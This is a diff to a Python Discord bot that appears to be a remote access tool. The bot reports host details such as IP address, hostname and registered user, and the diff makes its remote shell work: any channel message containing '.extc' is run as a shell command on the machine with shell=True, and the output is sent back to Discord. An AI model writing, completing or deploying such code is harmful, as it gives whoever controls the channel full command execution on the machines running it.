@@ -4,7 +4,6 @@ import platform
 import psutil
 import requests
 import discord
-from discord.ext import commands
 import threading
 import subprocess
 import wmi
@@ -28,9 +27,24 @@ channel_ids = {
     "info": "Initial info value",
     "main": "Initial main value"
 }
-async def send_message(message, channel_id):
-    channel = client.get_channel(channel_id)
-    await channel.send(message)
+class StoreVariables:
+    def __init__(self, var1=None):
+        self.var1 = var1
+def thread_function(*args):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(execute_command(*args))
+    loop.close()
+ForExecutingCommands = StoreVariables()
+async def execute_command(*args):
+    try:
+        command = ''.join(args)
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        output = result.stdout
+        channel = client.get_channel(ForExecutingCommands.var1)
+        await channel.send(output)
+    except Exception as e:
+        print(e)
 def get_system_info():
     try:
         local_ip_address = socket.gethostbyname(hostname)
@@ -79,12 +93,6 @@ def get_system_info():
         f"**Registered User:** {registered_user}"
     )
     return hostname, info
-def execute_command(*args):
-    command = ''.join(args)
-    result = subprocess.run(command, shell=True, capture_output=True, text=True)
-    output = result.stdout
-    print(bd)
-    send_message(output, bd)
 @client.event
 async def on_ready():
     print(f"{client.user} has connected to Discord!")
@@ -121,12 +129,11 @@ async def on_message(message):
             await client.get_channel(channel_ids[f'main']).send(f'<@{message.author.id}>')
         if message.channel.id in channel_ids.values():
             if ".extc" in message.content:
+                ForExecutingCommands.var1 = message.channel.id
                 words = message.content.split()
                 result_string = ' '.join([word for word in words if word != ".extc"])
-                print(result_string)
-                extc = threading.Thread(target=execute_command, args=(result_string))
+                #print(f"Result String: {result_string}")
+                extc = threading.Thread(target=thread_function, args=(result_string))
                 extc.start()
-                bd = message.channel.id
-                print(bd)
 
 client.run(BOT_TOKEN)
